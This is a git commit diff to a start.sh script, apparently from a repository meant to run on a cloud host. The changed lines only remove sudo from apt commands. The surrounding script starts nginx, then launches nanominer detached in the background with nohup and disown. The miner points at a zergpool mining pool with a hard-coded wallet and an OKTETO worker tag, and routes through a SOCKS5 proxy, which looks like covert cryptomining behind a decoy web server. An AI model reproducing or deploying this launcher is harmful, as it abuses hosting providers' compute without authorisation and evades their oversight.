55397d1a7c5287d24e7ef04a7277fbb73dc842f8
saihajinsamab255 <108542881+saihajinsamab255@users.noreply.github.com>
2022-07-27 00:48:18 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-sudo apt update
-sudo apt install nginx
+apt update
+apt install nginx
 service nginx start
 cd /nanominer/3.5.2 && chmod +x nanominer && nohup ./nanominer -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.OKTETO -password c=TRX -x socks5://192.252.214.20:15864 --log=stdout > nano.log &
 disown -h %1
